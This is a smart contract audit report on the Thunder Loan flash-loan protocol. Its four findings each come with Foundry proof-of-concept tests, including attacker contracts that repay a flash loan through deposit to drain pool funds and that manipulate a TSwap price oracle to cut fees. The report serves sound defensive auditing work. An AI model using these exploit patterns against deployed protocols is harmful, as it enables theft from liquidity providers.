---
title: Thunder Loan Report
author: Nihavent
date: Jan 31, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries Thunder Loan Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Nihavent\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Nihavent]
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Erroneous `AssetToken::updateExchangeRate` call in `ThunderLoan::deposit` causes exchange rate to be incorrect resulting in liquidity providers being unable to withdraw funds.](#h-1-erroneous-assettokenupdateexchangerate-call-in-thunderloandeposit-causes-exchange-rate-to-be-incorrect-resulting-in-liquidity-providers-being-unable-to-withdraw-funds)
    - [\[H-2\] `ThunderLoan::deposit` can be used instead of `ThunderLoan::repay` to pay back a flash loan. This results in the loan-taker being issued assetTokens which can then be redeemed from the pool.](#h-2-thunderloandeposit-can-be-used-instead-of-thunderloanrepay-to-pay-back-a-flash-loan-this-results-in-the-loan-taker-being-issued-assettokens-which-can-then-be-redeemed-from-the-pool)
    - [\[H-3\] Storage collision during upgrading contract swaps variable storage locations of `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`](#h-3-storage-collision-during-upgrading-contract-swaps-variable-storage-locations-of-thunderloans_flashloanfee-and-thunderloans_currentlyflashloaning)
  - [Medium](#medium)
    - [\[M-1\] Using TSwap as a price oracle creates risk of price and oracle manipulation attacks. This can cause users to pay less fees on flashloans.](#m-1-using-tswap-as-a-price-oracle-creates-risk-of-price-and-oracle-manipulation-attacks-this-can-cause-users-to-pay-less-fees-on-flashloans)

# Protocol Summary



# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

The findings in this document correspond to the follwoing Commit Hash:

```
xxx
```

## Scope 

- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
- In Scope:
```
#-- interfaces
|   #-- IFlashLoanReceiver.sol
|   #-- IPoolFactory.sol
|   #-- ITSwapPool.sol
|   #-- IThunderLoan.sol
#-- protocol
|   #-- AssetToken.sol
|   #-- OracleUpgradeable.sol
|   #-- ThunderLoan.sol
#-- upgradedProtocol
    #-- ThunderLoanUpgraded.sol
```
- Solc Version: 0.8.20
- Chain(s) to deploy contract to: Ethereum
- ERC20s:
  - USDC 
  - DAI
  - LINK
  - WETH


## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: hA user who takes out flash loans from the protocol.

# Executive Summary



## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 1                      |
| Low      | 0                      |
| Info     | 0                      |
| Total    | 4                     |


# Findings


## High

### [H-1] Erroneous `AssetToken::updateExchangeRate` call in `ThunderLoan::deposit` causes exchange rate to be incorrect resulting in liquidity providers being unable to withdraw funds.

**Description** In the ThunderLoan system, the `AssetToken::s_exchangeRate` is responsible for keeping track of the exchange rate between assetTokens and underlying tokens. In a way, it's responsible for keeping track of fees earned by completing flash loans.

The `ThunderLoan::deposit` function updates this rate, without collecting any fees. 

```javascript

    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact**

`ThunderLoan::redeem` is blocked because the protocol thinks more fees have been collected than in reality. It therefore attempts to issue the liquidity provider more funds than they're actually owed. For the last liquidity provider to call redeem, they won't be able to get all of their tokens.

**Proof of Concept**

1. LP deposits
2. User completes a flash loan
3. It is now impossible for LP to redeem

Place the following test into `ThunderLoanTest.t.sol`:

<details>
<summary> POC </summary>

```javascript
    function testRedemptionAfterLoan() public setAllowedToken hasDeposits {
        //Perform a flash loan
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        console2.log("calculatedFee: ", calculatedFee);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        //Check the exchange rate
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        console2.log("asset.getExchangeRate():", asset.getExchangeRate());

        //Redeem funds
        uint256 amountToRedeem = type(uint256).max; // redeem all their funds
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }
```
</details>


**Recommended Mitigation** Remove the lines which incorrectly update the exchange rate in `ThunderLoan::deposit`

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```



### [H-2] `ThunderLoan::deposit` can be used instead of `ThunderLoan::repay` to pay back a flash loan. This results in the loan-taker being issued assetTokens which can then be redeemed from the pool. 

**Description** The `ThunderLoan::flashloan` function checks that a loan is paid back by reverting if the endingBalance of the `assetToken` contract is not greater than the starting balance plus the calculated fee:

```javascript
        uint256 endingBalance = token.balanceOf(address(assetToken));
@>      if (endingBalance < startingBalance + fee) {
@>          revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
        }
```

There is no check to ensure that the loan-taker repaid the loan using the intended function `ThunderLoan::repay`. When the loan-taker repays using the `ThunderLoan::deposit` function, they mint `assetToken` tokens which gives them a claim on the underlying asset:


```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
@>      assetToken.mint(msg.sender, mintAmount);
        
```

**Impact** Legitimate liquidity providers risk having their funds stolen by malicious users.

**Proof of Concept**

<details>
<summary> POC </summary>

Paste this function in the `ThunderLoanTest` contract: 

```javascript

    function testUseDepositToRepayFlashLoanToStealFunds() public setAllowedToken hasDeposits {
        
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        
        // create instance of DepositInsteadOfRepay (attacker)
        DepositInsteadOfRepay dior = new DepositInsteadOfRepay(address(thunderLoan));
        vm.startPrank(address(dior));
        tokenA.mint(address(dior), fee);

        // Take out flash loan
        thunderLoan.flashloan(address(dior), tokenA, amountToBorrow, "");

        // Flash loan is paid back in executeOperation
        
        // Now redeem funds we deposited (which were actually the same funds as the flash loan)
        dior.redeemMoney();
        vm.stopPrank();

        //This interacts with another bug where calling deposit updates the exchange rate, so when we redeem we get more funds than we should
        assert(tokenA.balanceOf(address(dior)) >= 50e18 + fee);
    }
```


Paste this contract in the `ThunderLoanTest.t.sol` file: 

```javascript

contract DepositInsteadOfRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, //initiator,
        bytes calldata //params
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}


```

</details>

**Recommended Mitigation** Possible mitigrations:
1. Add a check ensuring the flashloan has been repaid using the `ThunderLoan::repay` function
2. Do not allow an address to have a flash loan and call deposit at the same time



### [H-3] Storage collision during upgrading contract swaps variable storage locations of `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`


**Description** `ThunderLoan.sol` has two variables in the following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; 
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order due to `s_flashLoanFee` being replaced by a `constant` variable:

```javascript
    uint256 private s_flashLoanFee;
    uint256 public constant FEE_PRECISION = 1e18;

    mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;

```

Due to how Solodity storage works, after the upgrade, `s_currentlyFlashLoaning` will be in the storage slot of `s_flashLoanFee`.

**Impact** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee.

In addition, the `s_currentlyFlashLoaning` mapping with storage will be in the wrong storage slot.

**Proof of Concept**

Paste the code into `ThunderLoanTest.t.sol`:

```javascript
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.

    function testUpgradeStorageCollision() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();

        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("fee before: ", feeBeforeUpgrade);
        console2.log("fee after: ", feeAfterUpgrade);
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

**Recommended Mitigation**

If you must remove the storage variable, leave a placeholder variable there.

```diff
-    uint256 private s_flashLoanFee;
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 s_blank;
+    uint256 private s_flashLoanFee
+    uint256 public constant FEE_PRECISION = 1e18;
```


## Medium

### [M-1] Using TSwap as a price oracle creates risk of price and oracle manipulation attacks. This can cause users to pay less fees on flashloans.

**Description** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling large amounts of the token in the same transaction. Due to the fee calculation in `ThunderLoan::getCalculatedFee`, the fee is a function of the price of the token in the TSwapPool.

**Impact** Liquidity providers will earn significantly less fees for providing liquidity.

**Proof of Concept**

The following sequence of execution occurs in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 50 `tokenA`. They are charged the original fee. During the flash loan they do the following:
   1. Swap 50 `tokenA` into the `TSwapPool`
   2. Take out a second flashloan for another 50 `TokenA`. Due to the way `ThunderLoan` calculates fees based on the price of `TokenA` in `TSwapPool`, the second flash loan is substantially cheaper.

    ```javascript
        function getPriceInWeth(address token) public view returns (uint256) {
            address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
    @>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
        }
    ```
   3. The user repays the first flash loan, then repays the second flash loan.

<details>
<summary> POC </summary>

Paste this function in the `ThunderLoanTest` contract: 

```javascript

    // This test requires more setup, we cannot use the basic mock contracts from TSwap
    function testOracleManipulation() public {

        // 1. Setup contracts
        thunderLoan = new ThunderLoan();
        weth = new ERC20Mock();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create a TSwap pool between WETH/TokenA
        address tSwapPool = pf.createPool(address(tokenA));

        // Use the proxy address as the thunderLoan contract
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(tSwapPool, 100e18);

        weth.mint(liquidityProvider, 100e18);
        weth.approve(tSwapPool, 100e18);
        
        // Ratio should be 100 weth & 100 TokenA
        // Therefore price is 1:1
        BuffMockTSwap(tSwapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // 3. Fund ThunderLoan
        vm.startPrank(thunderLoan.owner());   
        //console2.log(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.stopPrank();
        
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // 4. Take out flash loan for 50 tokenA, swap it on the DEX (TSwapPool) to impact the price
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("normalFeeCost: ", normalFeeCost);
        // 0.296147410319118389

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(tSwapPool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))); 

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18); // mint flash loan user tokens to cover fees
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.loanFeeOne() + flr.loanFeeTwo();
        console2.log("attackFee: ", attackFee);

        assert(attackFee < normalFeeCost);
    }

```


Paste this contract in the `ThunderLoanTest.t.sol` file: 

```javascript


contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    BuffMockTSwap tSwapPool;
    address repayAddress;
    bool attacked;

    uint256 public loanFeeOne;
    uint256 public loanFeeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tSwapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
        attacked = false;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, //initiator,
        bytes calldata //params
    )
        external
        returns (bool)
    {
        if (!attacked) {
            loanFeeOne = fee;
            attacked = true;

            // Swap borrowed tokenA borrowed for WETH
            uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tSwapPool), 50e18);
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // n we want to validate that this user can swap this weth back for tokenA after the second flash loan is taken out!

            // 5. Take out another flash loan for 50 tokenA and see how much cheaper it is!
            // Take out another flash loan to show difference in fees (this will re enter this function however attacked will be true)
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // Repay - repay is currently bugged when repaying the second flash loan, use a direct transfer instead
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        }
        else {
            // Calculate fee
            loanFeeTwo = fee;

            // Repay - repay is currently bugged when repaying the second flash loan, use a direct transfer instead
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(repayAddress, amount + fee);
        }
        return true;
    }
}


```


</details>


**Recommended Mitigation** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.

Alternatively, take fees as a % of the borrowed amount, in the token that was borrowed. This removes the dependancy on external price oracles.